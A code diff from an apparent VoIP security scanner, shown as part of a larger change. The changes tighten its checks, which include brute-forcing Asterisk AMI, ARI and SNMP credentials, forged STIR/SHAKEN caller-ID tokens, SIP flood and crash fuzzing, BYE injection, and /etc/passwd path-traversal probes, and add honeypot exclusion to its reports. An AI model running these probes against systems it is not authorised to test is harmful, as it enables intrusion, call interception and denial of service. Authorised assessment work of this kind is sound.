+            try:
+                w.close()
+                await asyncio.wait_for(w.wait_closed(), timeout=1.0)
+            except Exception:
+                pass
+            return b"Response: Success" in resp
+        except Exception:
+            return False
+
     for user,pwd in AMI_CREDS:
-        ok = await loop.run_in_executor(None,_try,user,pwd)
+        ok = await _try_ami(user, pwd)
         if ok:
             await st.finding(ip,"CREDENTIAL",f"Asterisk AMI Login: {user}:{pwd}","CRITICAL",
                 "Full PBX control — run commands, intercept calls, read CDR",
                 f"tcp://{ip}:{AMI_PORT}")
             return
+        await asyncio.sleep(0.1)  # Brief rate-limit between attempts
+
 
 async def _ari_brute(ip,st,sess):
     for user,pwd in ARI_CREDS:
         for proto,port in [("http",8088),("https",8089)]:
             c,b = await http_get(sess,f"{proto}://{ip}:{port}/ari/applications",
                                  auth=(user,pwd),timeout=5)
-            if c==200:
+            if c==200 and re.search(r'(\[|\{|application)',b,re.I):
                 await st.finding(ip,"CREDENTIAL",f"Asterisk ARI Login: {user}:{pwd}","CRITICAL",
                     "ARI full access — real-time call control, eavesdropping, CDR access",
                     f"{proto}://{ip}:{port}/ari/")
                 return
+
 
 async def _ami_http(ip,st,sess):
     for proto,port in [("http",8088),("https",8089)]:
@@ -1983,8 +2493,8 @@ async def _ami_http(ip,st,sess):
                     "AMI-over-HTTP accepted",f"{proto}://{ip}:{port}/rawman")
                 return
 
+
 async def _stir_shaken(ip,st):
-    """STIR/SHAKEN bypass — present invalid Identity header."""
     fake_identity = (
         "eyJhbGciOiJFUzI1NiIsInBwdCI6InNoYWtlbiIsInR5cCI6InBhc3Nwb3J0IiwieDV1IjoiaHR0cDovL2Zha2UuaW52YWxpZC9jZXJ0LnBlbSJ9"
         ".eyJhdHRlc3QiOiJBIiwiZGVzdCI6eyJ0biI6WyIrMTIzNDU2Nzg5MCJdfSwiaWF0IjoxNjAwMDAwMDAwLCJvcmlnIjp7InRuIjoiKzE5ODc2NTQzMjEifSwib3JpZ2lkIjoiMDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwIn0"
@@ -1994,8 +2504,9 @@ async def _stir_shaken(ip,st):
              f"To: <sip:+12345678901@{ip}>\r\nFrom: <sip:+19876543210@{ip}>;tag={_sid()[:8]}\r\n")
     pkt  = sip_msg("INVITE",ip,extra_hdrs=extra,body=sdp(ip))
     resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and re.search(r"SIP/2\.0 (100|180|183|200)",resp):
-        await st.finding(ip,"CVE-2022-26499","STIR/SHAKEN Verification Bypass","HIGH",
+    # Only flag on 180/200 — the STIR token is invalid so 403 would be correct
+    if resp and re.search(r"SIP/2\.0 (180|183|200)",resp):
+        await st.finding(ip,"CVE-2022-26499","STIR/SHAKEN Verification Bypass — Call Accepted","HIGH",
             "Server accepted INVITE with invalid/unsigned Identity header — caller-ID spoofing",
             f"sip://{ip}:5060")
 
@@ -2023,6 +2534,7 @@ async def phase12_dos(state:State, sem:asyncio.Semaphore):
     await asyncio.gather(*[_sem_probe(sem, dos_all, ip) for ip in state.live_ips])
     Con.ok("Phase 12 complete — DoS testing done")
 
+
 async def _invite_flood(ip,st):
     pkts  = [sip_msg("INVITE",ip,body=sdp(ip),cseq=i) for i in range(1,11)]
     t0    = time.monotonic()
@@ -2030,9 +2542,10 @@ async def _invite_flood(ip,st):
     dt    = time.monotonic()-t0
     answered = sum(1 for r in resps if r)
     if answered>=7:
-        await st.finding(ip,"EXPOSURE","INVITE Flood — No Rate Limiting","MEDIUM",
-            f"{answered}/10 rapid INVITEs answered ({dt:.1f}s) — flood protection absent",
+        await st.finding(ip,"EXPOSURE","INVITE Flood — No Rate Limiting Detected","MEDIUM",
+            f"{answered}/10 rapid INVITEs answered in {dt:.1f}s — flood protection absent",
             f"sip://{ip}:5060")
+
 
 async def _register_flood(ip,st):
     async def flood_reg(i):
@@ -2046,14 +2559,17 @@ async def _register_flood(ip,st):
         await st.finding(ip,"EXPOSURE","REGISTER Flood — No Rate Limiting","MEDIUM",
             f"{answered}/15 flood REGISTERs answered",f"sip://{ip}:5060")
 
+
 async def _bye_inject(ip,st):
+    """BYE injection: a proper server should return 481 (no such transaction), not 200."""
     extra = (f"To: <sip:victim@{ip}>;tag={_sid()[:8]}\r\n"
              f"From: <sip:attacker@scanner>;tag={_sid()[:8]}\r\n")
     resp = await sip_probe(ip,5060,sip_msg("BYE",ip,extra_hdrs=extra),timeout=5)
-    if resp and "200 OK" in resp:
-        await st.finding(ip,"MISCONFIGURATION","BYE Injection Accepted (200 OK)","CRITICAL",
+    if resp and re.search(r"SIP/2\.0 200 OK",resp):
+        await st.finding(ip,"MISCONFIGURATION","BYE Injection Accepted (200 OK) — Out-of-Dialog","CRITICAL",
             "Out-of-dialog BYE returned 200 — active calls terminatable by attacker",
             f"sip://{ip}:5060")
+
 
 async def _cancel_storm(ip,st):
     pkts  = [sip_msg("CANCEL",ip,cseq=i) for i in range(8)]
@@ -2064,42 +2580,51 @@ async def _cancel_storm(ip,st):
             f"{errors}/8 CANCEL messages caused 500 — server unstable under CANCEL flood",
             f"sip://{ip}:5060")
 
+
 async def _options_flood(ip,st):
     pkts  = [sip_msg("OPTIONS",ip,cseq=i) for i in range(20)]
     resps = await asyncio.gather(*[udp_xfer(ip,5060,p,timeout=1) for p in pkts])
     answered = sum(1 for r in resps if r)
     if answered>=18:
         await st.finding(ip,"EXPOSURE","OPTIONS Flood Not Rate-Limited","LOW",
-            f"{answered}/20 OPTIONS answered",f"sip://{ip}:5060")
+            f"{answered}/20 OPTIONS answered without rate limit",f"sip://{ip}:5060")
+
 
 async def _malformed_sdp(ip,st):
-    for bad_sdp in ["v=INVALID\r\nm=audio BADPORT INVALID 0\r\n",
+    for bad_sdp_body in ["v=INVALID\r\nm=audio BADPORT INVALID 0\r\n",
                     "v=0\r\n"+"x"*65536+"\r\n"]:
-        pkt  = sip_msg("INVITE",ip,body=bad_sdp)
-        resp = await sip_probe(ip,5060,pkt,timeout=5)
-        if resp and "500" in resp:
+        pkt  = sip_msg("INVITE",ip,body=bad_sdp_body)
+        resp1 = await sip_probe(ip,5060,pkt,timeout=5)
+        # Verify server is still up
+        resp2 = await sip_probe(ip,5060,sip_msg("OPTIONS",ip),timeout=3)
+        if resp1 and "500" in resp1:
             await st.finding(ip,"FUZZING","Malformed SDP → 500 Error","HIGH",
-                "Server crashed on invalid SDP — possible parser memory corruption",
+                "Server returned 500 on invalid SDP — possible parser vulnerability",
+                f"sip://{ip}:5060")
+            return
+        elif resp1 and not resp2:
+            await st.finding(ip,"FUZZING","Malformed SDP → Server Crash","CRITICAL",
+                "Server stopped responding after malformed SDP — crash induced",
                 f"sip://{ip}:5060")
             return
 
+
 async def _subscribe_bomb(ip,st):
-    """Send 10 SUBSCRIBE for different event packages."""
     events = ["presence","dialog","message-summary","reg","call-info",
               "ua-profile","voicemail","conference","spirits-INDPs","check-sync"]
     answered = 0
     for ev in events:
         extra = f"Event: {ev}\r\nExpires: 3600\r\n"
         resp  = await sip_probe(ip,5060,sip_msg("SUBSCRIBE",ip,extra_hdrs=extra),timeout=3)
-        if resp and "200 OK" in resp:
+        if resp and re.search(r"SIP/2\.0 200 OK",resp):
             answered += 1
     if answered>=5:
         await st.finding(ip,"EXPOSURE","SUBSCRIBE Bomb — Multiple Event Packages Accepted","MEDIUM",
             f"{answered}/10 SUBSCRIBE event types accepted without auth — resource exhaustion",
             f"sip://{ip}:5060")
 
+
 async def _publish_flood(ip,st):
-    """SIP PUBLISH flood — many entities publishing presence."""
     body  = '<?xml version="1.0"?><presence xmlns="urn:ietf:params:xml:ns:pidf"><tuple id="x"><status><basic>open</basic></status></tuple></presence>'
     extra = "Event: presence\r\nExpires: 3600\r\nContent-Type: application/pidf+xml\r\n"
     pkts  = [sip_msg("PUBLISH",ip,from_user=f"flood{i}",extra_hdrs=extra,body=body)
@@ -2111,8 +2636,8 @@ async def _publish_flood(ip,st):
             f"{ok}/8 PUBLISH messages accepted — presence DB DoS possible",
             f"sip://{ip}:5060")
 
+
 async def _re_invite_loop(ip,st):
-    """Re-INVITE loop — send rapidly to same dialog-less call-ID."""
     call_id = f"loop{_sid()}@scanner"
     pkts = []
     for i in range(5):
@@ -2138,7 +2663,7 @@ async def phase13_snmp_mgmt(state:State, sess, sem:asyncio.Semaphore):
 
     async def mgmt_all(ip:str):
         await asyncio.gather(
-            safe(_snmp_brute(ip,state),       "snmp"),
+            safe(_snmp_brute(ip,state),        "snmp"),
             safe(_path_traversal(ip,state,sess),"path_trav"),
             safe(_dir_listing(ip,state,sess),  "dir_list"),
             safe(_exposed_backup(ip,state,sess),"backup"),
@@ -2148,25 +2673,108 @@ async def phase13_snmp_mgmt(state:State, sess, sem:asyncio.Semaphore):
     await asyncio.gather(*[_sem_probe(sem, mgmt_all, ip) for ip in state.live_ips])
     Con.ok("Phase 13 complete — management testing done")
 
-async def _snmp_brute(ip,st):
-    loop = asyncio.get_event_loop()
-    def _try_snmp(community):
-        try:
-            import subprocess
-            r = subprocess.run(
-                ["snmpget","-v1",f"-c{community}","-t2","-r0",ip,"sysDescr.0"],
-                capture_output=True,text=True,timeout=4)
-            if "STRING" in r.stdout:
-                return r.stdout.split("STRING:")[-1].strip()[:120]
-        except: pass
+
+def _build_snmp_get(community: str, oid_ints: List[int]) -> bytes:
+    """Build raw SNMP v1 GetRequest packet without any external library."""
+    def _ber_len(n: int) -> bytes:
+        if n < 0x80:
+            return bytes([n])
+        elif n < 0x100:
+            return b"\x81" + bytes([n])
+        else:
+            return b"\x82" + bytes([n >> 8, n & 0xff])
+
+    def _ber_int(n: int) -> bytes:
+        if n == 0:
+            return b"\x02\x01\x00"
+        parts = []
+        while n:
+            parts.insert(0, n & 0xff)
+            n >>= 8
+        if parts[0] & 0x80:
+            parts.insert(0, 0)
+        return b"\x02" + _ber_len(len(parts)) + bytes(parts)
+
+    def _ber_oid(oids: List[int]) -> bytes:
+        if len(oids) < 2:
+            return b""
+        body = bytes([oids[0]*40 + oids[1]])
+        for v in oids[2:]:
+            if v < 0x80:
+                body += bytes([v])
+            else:
+                parts = []
+                while v:
+                    parts.insert(0, (v & 0x7f) | (0x80 if parts else 0))
+                    v >>= 7
+                parts[-1] &= 0x7f
+                body += bytes(parts)
+        return b"\x06" + _ber_len(len(body)) + body
+
+    # VarBind: OID + NULL
+    oid_bytes = _ber_oid(oid_ints)
+    var_bind   = oid_bytes + b"\x05\x00"
+    var_bind   = b"\x30" + _ber_len(len(var_bind)) + var_bind
+    var_binds  = b"\x30" + _ber_len(len(var_bind)) + var_bind
+
+    req_id     = _ber_int(random.randint(1, 0x7fffffff))
+    err_status = b"\x02\x01\x00"
+    err_index  = b"\x02\x01\x00"
+    pdu_body   = req_id + err_status + err_index + var_binds
+    pdu        = b"\xa0" + _ber_len(len(pdu_body)) + pdu_body
+
+    comm_b     = community.encode()
+    community_field = b"\x04" + _ber_len(len(comm_b)) + comm_b
+    version    = b"\x02\x01\x00"  # v1
+    msg_body   = version + community_field + pdu
+    return b"\x30" + _ber_len(len(msg_body)) + msg_body
+
+
+def _parse_snmp_string(resp: bytes) -> str:
+    """Extract OCTET STRING value from SNMP response."""
+    if not resp or len(resp) < 10:
         return ""
-    for community in SNMP_COMMUNITIES:
-        info = await loop.run_in_executor(None,_try_snmp,community)
-        if info:
-            await st.finding(ip,"MISCONFIGURATION",
-                f"SNMP Community '{community}' Valid","HIGH",
-                f"sysDescr: {info}",f"udp://{ip}:161")
-            return
+    # Look for OCTET STRING tag (0x04) in the response
+    idx = resp.find(b"\x04")
+    while idx != -1 and idx < len(resp)-2:
+        length = resp[idx+1]
+        if idx+2+length <= len(resp):
+            val = resp[idx+2:idx+2+length]
+            decoded = val.decode(errors="replace").strip()
+            if len(decoded) > 3 and not decoded.startswith("\x00"):
+                return decoded[:120]
+        idx = resp.find(b"\x04", idx+1)
+    return ""
+
+
+async def _snmp_brute(ip,st):
+    """True async SNMP brute using raw UDP packets — no subprocess."""
+    # sysDescr OID: 1.3.6.1.2.1.1.1.0
+    sysDescr_oid = [1,3,6,1,2,1,1,1,0]
+
+    # Send all community probes in parallel batches
+    async def _try_community(community: str) -> Tuple[str, str]:
+        pkt = _build_snmp_get(community, sysDescr_oid)
+        resp = await udp_xfer(ip, 161, pkt, timeout=2.0, retries=1)
+        if resp and len(resp) > 10:
+            # Check it's a GetResponse (0xa2)
+            if b"\xa2" in resp[:20]:
+                desc = _parse_snmp_string(resp)
+                return community, desc
+        return community, ""
+
+    # Test communities in batches of 5 for speed
+    communities = SNMP_COMMUNITIES
+    for i in range(0, len(communities), 5):
+        batch = communities[i:i+5]
+        results = await asyncio.gather(*[_try_community(c) for c in batch])
+        for community, desc in results:
+            if desc:
+                await st.finding(ip,"MISCONFIGURATION",
+                    f"SNMP Community '{community}' Valid — sysDescr: {desc[:60]}","HIGH",
+                    f"sysDescr: {desc}",f"udp://{ip}:161")
+                return
+
 
 async def _path_traversal(ip,st,sess):
     traversals = [
@@ -2180,10 +2788,11 @@ async def _path_traversal(ip,st,sess):
     for path in traversals:
         for proto,port in [("http",80),("https",443),("http",8080)]:
             c,b = await http_get(sess,f"{proto}://{ip}:{port}{path}",timeout=5)
-            if c and "root:x:0:0" in b:
-                await st.finding(ip,"CVE-2020-3381","Path Traversal /etc/passwd Readable",
-                    "CRITICAL",f"LFI via {path}",f"{proto}://{ip}:{port}{path}")
+            if c and FILE_READ_PATTERNS.search(b):
+                await st.finding(ip,"CVE-2020-3381","Path Traversal — /etc/passwd Readable",
+                    "CRITICAL",f"LFI confirmed via {path}",f"{proto}://{ip}:{port}{path}")
                 return
+
 
 async def _dir_listing(ip,st,sess):
     for path in ["/admin/","/config/","/logs/","/backup/","/recordings/"]:
@@ -2192,6 +2801,7 @@ async def _dir_listing(ip,st,sess):
             await st.finding(ip,"INFO-DISCLOSURE",f"Directory Listing at {path}","MEDIUM",
                 f"Directory listing exposed at http://{ip}{path}",f"http://{ip}{path}")
             return
+
 
 async def _exposed_backup(ip,st,sess):
     for path in ["/backup.tar.gz","/asterisk.conf.bak",
@@ -2205,11 +2815,12 @@ async def _exposed_backup(ip,st,sess):
                     "Backup file contains credentials/config",f"{proto}://{ip}:{port}{path}")
                 return
 
+
 async def _api_info_leak(ip,st,sess):
     for path in ["/api/v1/info","/api/info","/status","/health",
                  "/api/v1/system","/metrics"]:
         c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
-        if c==200 and re.search(r'version|build|serial|mac|hostname|uptime',b,re.I):
+        if c==200 and re.search(r'"(version|build|serial|mac|hostname|uptime)"',b,re.I):
             await st.finding(ip,"INFO-DISCLOSURE","API Info Endpoint Exposed","LOW",
                 f"System info at http://{ip}{path}",f"http://{ip}{path}")
             return
@@ -2224,25 +2835,26 @@ async def phase14_vendor(state:State, sess, sem:asyncio.Semaphore):
 
     async def vendor_all(ip:str):
         await asyncio.gather(
-            safe(_v_cisco_cucm(ip,state,sess),   "cisco_cucm"),
-            safe(_v_avaya_full(ip,state,sess),   "avaya"),
+            safe(_v_cisco_cucm(ip,state,sess),      "cisco_cucm"),
+            safe(_v_avaya_full(ip,state,sess),      "avaya"),
             safe(_v_grandstream_full(ip,state,sess),"grandstream"),
-            safe(_v_polycom_full(ip,state,sess), "polycom"),
-            safe(_v_yealink_full(ip,state,sess), "yealink"),
-            safe(_v_freepbx_full(ip,state,sess), "freepbx"),
-            safe(_v_3cx_full(ip,state,sess),     "3cx"),
-            safe(_v_elastix_full(ip,state,sess), "elastix"),
-            safe(_v_mitel_full(ip,state,sess),   "mitel"),
-            safe(_v_kamailio_full(ip,state,sess),"kamailio"),
-            safe(_v_nec(ip,state,sess),          "nec"),
-            safe(_v_panasonic(ip,state,sess),    "panasonic"),
-            safe(_v_audiocodes_full(ip,state,sess),"audiocodes"),
+            safe(_v_polycom_full(ip,state,sess),    "polycom"),
+            safe(_v_yealink_full(ip,state,sess),    "yealink"),
+            safe(_v_freepbx_full(ip,state,sess),    "freepbx"),
+            safe(_v_3cx_full(ip,state,sess),        "3cx"),
+            safe(_v_elastix_full(ip,state,sess),    "elastix"),
+            safe(_v_mitel_full(ip,state,sess),      "mitel"),
+            safe(_v_kamailio_full(ip,state,sess),   "kamailio"),
+            safe(_v_nec(ip,state,sess),             "nec"),
+            safe(_v_panasonic(ip,state,sess),       "panasonic"),
+            safe(_v_audiocodes_full(ip,state,sess), "audiocodes"),
             safe(_v_voipmonitor_full(ip,state,sess),"voipmonitor"),
-            safe(_v_fanvil(ip,state,sess),       "fanvil"),
+            safe(_v_fanvil(ip,state,sess),          "fanvil"),
         )
 
     await asyncio.gather(*[_sem_probe(sem, vendor_all, ip) for ip in state.live_ips])
-    Con.ok(f"Phase 14 complete — vendor-specific tests done")
+    Con.ok("Phase 14 complete — vendor-specific tests done")
+
 
 async def _v_cisco_cucm(ip,st,sess):
     for path,cve in [
@@ -2252,17 +2864,17 @@ async def _v_cisco_cucm(ip,st,sess):
         ("/ccmservice/","CVE-2022-31601"),
     ]:
         c,b = await http_get(sess,f"https://{ip}:8443{path}",timeout=5)
-        if c and c!=404:
+        if c and c not in (404,000) and re.search(r'cisco|cucm|callmanager',b,re.I):
             await st.finding(ip,cve,CVE_DB.get(cve,("Cisco CUCM","HIGH"))[0],
                 CVE_DB.get(cve,("","HIGH"))[1],
-                f"Cisco CUCM path accessible",f"https://{ip}:8443{path}")
+                f"Cisco CUCM path accessible at {path}",f"https://{ip}:8443{path}")
             return
-    # Cisco IP Phone direct
     c,b = await http_get(sess,
         f"https://{ip}/CGI/Java/Serviceability?adapter=device.statistics.device",timeout=5)
-    if c==200:
+    if c==200 and re.search(r'cisco|phone|sep',b,re.I):
         await st.finding(ip,"CVE-2020-3161","Cisco IP Phone HTTP Interface","CRITICAL",
             "Phone web service reachable — RCE on 7800/8800",f"https://{ip}/CGI/")
+
 
 async def _v_avaya_full(ip,st,sess):
     for url,cve,title,sev in [
@@ -2276,6 +2888,7 @@ async def _v_avaya_full(ip,st,sess):
             await st.finding(ip,cve,title,sev,f"Avaya interface at {url}",url)
             return
 
+
 async def _v_grandstream_full(ip,st,sess):
     for url,cve in [
         (f"http://{ip}:8089/cgi-bin/api.values.get","CVE-2022-37397"),
@@ -2283,9 +2896,11 @@ async def _v_grandstream_full(ip,st,sess):
         (f"http://{ip}:80/cgi-bin/ConfigManApp.com","CVE-2019-10660"),
     ]:
         c,b = await http_get(sess,url,timeout=5)
-        if c and re.search(r'grandstream|ucm|GVC|GXP',b,re.I):
+        if c==200 and re.search(r'grandstream|ucm|GVC|GXP',b,re.I) \
+                and re.search(r'(response|result|value|system)',b,re.I):
             title,sev = CVE_DB.get(cve,("Grandstream Vuln","CRITICAL"))
-            await st.finding(ip,cve,title,sev,"Grandstream API accessible",url)
+            await st.finding(ip,cve,title,sev,"Grandstream API returns data without auth",url)
+
 
 async def _v_polycom_full(ip,st,sess):
     for path,creds,cve in [
@@ -2299,23 +2914,29 @@ async def _v_polycom_full(ip,st,sess):
             await st.finding(ip,cve,title,sev,
                 f"Accepted {creds[0]}:{creds[1]}",f"http://{ip}{path}")
 
+
 async def _v_yealink_full(ip,st,sess):
     for url,cve in [
         (f"https://{ip}/api/v1/accounts","CVE-2021-27561"),
         (f"http://{ip}:8080/api/v1/","CVE-2021-27562"),
     ]:
         c,b = await http_get(sess,url,timeout=5)
-        if c and re.search(r'yealink|account',b,re.I):
+        if c==200 and re.search(r'yealink|account',b,re.I):
             t,s = CVE_DB.get(cve,("Yealink","CRITICAL"))
             await st.finding(ip,cve,t,s,"Yealink API without auth",url)
             return
-    # Default creds
     c,b = await http_get(sess,f"http://{ip}/",auth=("admin","admin"),timeout=5)
-    if c==200 and "yealink" in b.lower():
+    if c==200 and "yealink" in b.lower() \
+            and re.search(r'(logout|dashboard|settings|config)',b,re.I):
         await st.finding(ip,"CVE-2021-21224","Yealink Default admin:admin","HIGH",
-            "Accepted admin:admin",f"http://{ip}/")
+            "Accepted admin:admin — logged in to Yealink phone",f"http://{ip}/")
+
 
 async def _v_freepbx_full(ip,st,sess):
+    # Confirm FreePBX first
+    c0,b0 = await http_get(sess,f"http://{ip}/admin/",timeout=5)
+    if not (c0 and re.search(r'freepbx|sangoma',b0,re.I)):
+        return
     for path,cve in [
         ("/admin/ajax.php?module=framework&command=checkDependencies","CVE-2022-26272"),
         ("/admin/ajax.php?module=userman&command=getAll","CVE-2020-36166"),
@@ -2323,10 +2944,13 @@ async def _v_freepbx_full(ip,st,sess):
         ("/admin/modules.php","CVE-2019-11334"),
     ]:
         c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
-        if c and re.search(r'freepbx|sangoma|framework',b,re.I):
+        if c==200 and re.search(r'(json|result|success|module)',b,re.I) \
+                and not re.search(r'(login|password)',b,re.I):
             t,s = CVE_DB.get(cve,("FreePBX RCE","CRITICAL"))
-            await st.finding(ip,cve,t,s,"FreePBX panel accessible",f"http://{ip}{path}")
+            await st.finding(ip,cve,t,s,"FreePBX endpoint returns data without auth",
+                f"http://{ip}{path}")
             return
+
 
 async def _v_3cx_full(ip,st,sess):
     for url,cve in [
@@ -2335,10 +2959,11 @@ async def _v_3cx_full(ip,st,sess):
         (f"http://{ip}:5000/api/v1/status","CVE-2023-29059"),
     ]:
         c,b = await http_get(sess,url,timeout=5)
-        if c and re.search(r'3cx|phonesystem',b,re.I):
+        if c==200 and re.search(r'3cx|phonesystem',b,re.I):
             t,s = CVE_DB.get(cve,("3CX","CRITICAL"))
-            await st.finding(ip,cve,t,s,"3CX detected",url)
+            await st.finding(ip,cve,t,s,"3CX detected — verify auth bypass",url)
             return
+
 
 async def _v_elastix_full(ip,st,sess):
     for path,cve in [
@@ -2346,10 +2971,18 @@ async def _v_elastix_full(ip,st,sess):
         ("/modules/admin/index.php","CVE-2012-1233"),
     ]:
         c,b = await http_get(sess,f"https://{ip}{path}",timeout=5)
-        if c and ("root:x:0:0" in b or re.search(r'elastix|issabel',b,re.I)):
+        if c and FILE_READ_PATTERNS.search(b):
             t,s = CVE_DB.get(cve,("Elastix","CRITICAL"))
-            await st.finding(ip,cve,t,s,"Elastix vulnerable",f"https://{ip}{path}")
+            await st.finding(ip,cve,t+" — LFI Confirmed",s,
+                "File content confirmed in response",f"https://{ip}{path}")
             return
+        elif c and re.search(r'elastix|issabel',b,re.I):
+            t,s = CVE_DB.get(cve,("Elastix","CRITICAL"))
+            await st.finding(ip,cve,t+" (Detected)",
+                "HIGH","Elastix panel accessible — manual verification recommended",
+                f"https://{ip}{path}")
+            return
+
 
 async def _v_mitel_full(ip,st,sess):
     for path,cve,sev in [
@@ -2364,6 +2997,7 @@ async def _v_mitel_full(ip,st,sess):
                 f"https://{ip}{path}")
             return
 
+
 async def _v_kamailio_full(ip,st,sess):
     for url,cve in [
         (f"http://{ip}:8080/mi","CVE-2022-44877"),
@@ -2373,10 +3007,12 @@ async def _v_kamailio_full(ip,st,sess):
         c,b = await http_get(sess,url,
             data='{"jsonrpc":"2.0","method":"core.info","id":1}',
             headers={"Content-Type":"application/json"},timeout=5)
-        if c and re.search(r'kamailio|opensips|version',b,re.I):
+        if c==200 and re.search(r'"id"\s*:\s*1',b) \
+                and re.search(r'kamailio|opensips|version',b,re.I):
             t,s = CVE_DB.get(cve,("Kamailio MI","CRITICAL"))
-            await st.finding(ip,cve,t,s,"MI API without auth",url)
+            await st.finding(ip,cve,t,s,"MI API responded to core.info without auth",url)
             return
+
 
 async def _v_nec(ip,st,sess):
     for path in ["/nec/","/sv9100/","/univerge/"]:
@@ -2386,6 +3022,7 @@ async def _v_nec(ip,st,sess):
                 f"NEC PBX at https://{ip}{path}",f"https://{ip}{path}")
             return
 
+
 async def _v_panasonic(ip,st,sess):
     for path in ["/kx-ns/","/panasonic/","/kx-hts/"]:
         c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
@@ -2394,6 +3031,7 @@ async def _v_panasonic(ip,st,sess):
                 f"Panasonic PBX at http://{ip}{path}",f"http://{ip}{path}")
             return
 
+
 async def _v_audiocodes_full(ip,st,sess):
     for path,cve in [
         ("/inifile/","CVE-2019-9202"),
@@ -2401,11 +3039,12 @@ async def _v_audiocodes_full(ip,st,sess):
         ("/cgi-bin/manage","CVE-2019-9202"),
     ]:
         c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
-        if c and re.search(r'audiocodes|mediapack|mediant|gateway',b,re.I):
+        if c==200 and re.search(r'audiocodes|mediapack|mediant|gateway',b,re.I):
             t,s = CVE_DB.get(cve,("AudioCodes","HIGH"))
             await st.finding(ip,cve,t,s,f"AudioCodes at http://{ip}{path}",
                 f"http://{ip}{path}")
             return
+
 
 async def _v_voipmonitor_full(ip,st,sess):
     for port in [80,443,8080]:
@@ -2414,15 +3053,17 @@ async def _v_voipmonitor_full(ip,st,sess):
         if c and "VoIPmonitor" in b:
             c2,b2 = await http_get(sess,
                 f"{proto}://{ip}:{port}/cdrproxy.php?host=127.0.0.1",timeout=5)
-            if c2==200:
-                await st.finding(ip,"CVE-2021-30461-B","VoIPmonitor cdrproxy SSRF","CRITICAL",
-                    "cdrproxy.php: RCE via host parameter",
+            if c2==200 and re.search(r'(cdr|proxy|response|result)',b2,re.I):
+                await st.finding(ip,"CVE-2021-30461-B","VoIPmonitor cdrproxy SSRF confirmed",
+                    "CRITICAL","cdrproxy.php fetches internal hosts without auth",
                     f"{proto}://{ip}:{port}/cdrproxy.php")
             return
 
+
 async def _v_fanvil(ip,st,sess):
     c,b = await http_get(sess,f"http://{ip}/",auth=("admin","admin"),timeout=5)
-    if c==200 and re.search(r'fanvil',b,re.I):
+    if c==200 and re.search(r'fanvil',b,re.I) \
+            and re.search(r'(logout|settings|config|panel)',b,re.I):
         await st.finding(ip,"CREDENTIAL","Fanvil Phone Default admin:admin","HIGH",
             "Fanvil IP phone accepted default credentials",f"http://{ip}/")
 
@@ -2505,7 +3146,7 @@ def phase15_cdr(cdr_file:str, rd:Path):
 # ══════════════════════════════════════════════════════════
 HARDENING_CONF = """\
 ╔══════════════════════════════════════════════════════╗
-║   VOIP HARDENING CONFIGURATION v6.0                 ║
+║   VOIP HARDENING CONFIGURATION v7.0                 ║
 ╚══════════════════════════════════════════════════════╝
 
 ━━━ Asterisk sip.conf / pjsip.conf ━━━━━━━━━━━━━━━━━━
@@ -2547,6 +3188,7 @@ iptables -A INPUT -p udp --dport 5060 -j DROP
 15. Centralised logging: ELK/Splunk with SIP anomaly
 """
 
+
 def phase16_report(state:State, input_file:str, rd:Path):
     Con.phase("PHASE 16 │ EXECUTIVE SUMMARY · HTML REPORT · HARDENING")
     rd.mkdir(parents=True,exist_ok=True)
@@ -2580,6 +3222,7 @@ SCAN METRICS
 {"═"*72}
   Targets provided        : {n_targets}
   Live hosts discovered   : {len(state.live_ips)}
+  Honeypots excluded      : {len(state.honeypot_ips)}
   IAX2 hosts              : {len(state.iax2_hosts)}
   MGCP hosts              : {len(state.mgcp_hosts)}
   SCCP hosts              : {len(state.sccp_hosts)}
@@ -2618,20 +3261,21 @@ GENERATED FILES
 {"═"*72}
   results/cve_findings.json                — structured findings
   results/service_fingerprints.json        — fingerprint data
-  results/verified_voip_vulnerabilities.txt — human-readable
+  results/verified_voip_vulnerabilities.txt — human-readable verified
   results/valid_extensions.txt             — discovered extensions
   results/digest_hashes.txt               — SIP digest challenges
   results/provisioning_findings.txt        — TFTP/HTTP prov issues
   results/fraud_analysis.txt               — CDR anomaly report
   results/hardening_config.txt             — remediation config
   results/voip_report.html                 — interactive HTML report
+  results/honeypot_ips.txt                 — excluded honeypot hosts
 """
     (rd/"executive_summary.txt").write_text(summary,encoding="utf-8")
     print(summary)
 
-    # HTML report
     _write_html(state, rd, n_targets, risk_level, elapsed)
     Con.ok(f"Phase 16 complete — all reports written to {rd}/")
+
 
 HTML_SEV = {
     "CRITICAL":"#dc2626","HIGH":"#ea580c","MEDIUM":"#d97706",
@@ -2640,11 +3284,13 @@ HTML_SEV = {
     "CREDENTIAL":"#be123c","MISCONFIGURATION":"#0369a1","WEAK-CRYPTO":"#475569",
     "INFO-DISCLOSURE":"#6d28d9",
 }
+
 def _badge(sev:str)->str:
     c=HTML_SEV.get(sev,"#6b7280")
     return (f'<span style="background:{c};color:#fff;padding:2px 8px;'
             f'border-radius:4px;font-size:11px;font-weight:bold">'
             f'{html_lib.escape(sev)}</span>')
+
 
 def _write_html(state:State, rd:Path, n_targets:int,
                 risk_level:str, elapsed:float):
@@ -2654,6 +3300,7 @@ def _write_html(state:State, rd:Path, n_targets:int,
     stat_cards = ""
     for label,val,col_hex in [
         ("Targets",n_targets,"#0369a1"),("Live",len(state.live_ips),"#059669"),
+        ("Honeypots",len(state.honeypot_ips),"#7c3aed"),
         ("CRITICAL",by_sev.get("CRITICAL",0),"#dc2626"),
         ("HIGH",by_sev.get("HIGH",0),"#ea580c"),
         ("MEDIUM",by_sev.get("MEDIUM",0),"#d97706"),
@@ -2697,6 +3344,9 @@ def _write_html(state:State, rd:Path, n_targets:int,
     hash_list = "<br>".join(
         html_lib.escape(f"{h['ip']} {h.get('hash_line','')}")
         for h in state.digest_hashes[:20])
+
+    honeypot_list = ", ".join(
+        html_lib.escape(ip) for ip in sorted(state.honeypot_ips)[:20])
 
     h = f"""<!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8">
@@ -2785,6 +3435,8 @@ function ft(){{
     <pre>{hash_list or 'None captured'}</pre>
   </div>
 
+  {'<div class="card"><h2>Honeypots Excluded (' + str(len(state.honeypot_ips)) + ')</h2><p style="font-size:13px;color:#7c3aed">' + (honeypot_list or 'None') + '</p></div>' if state.honeypot_ips else ''}
+
   <div class="card">
     <h2>Remediation Checklist</h2>
     <ul style="line-height:2.2;font-size:14px">
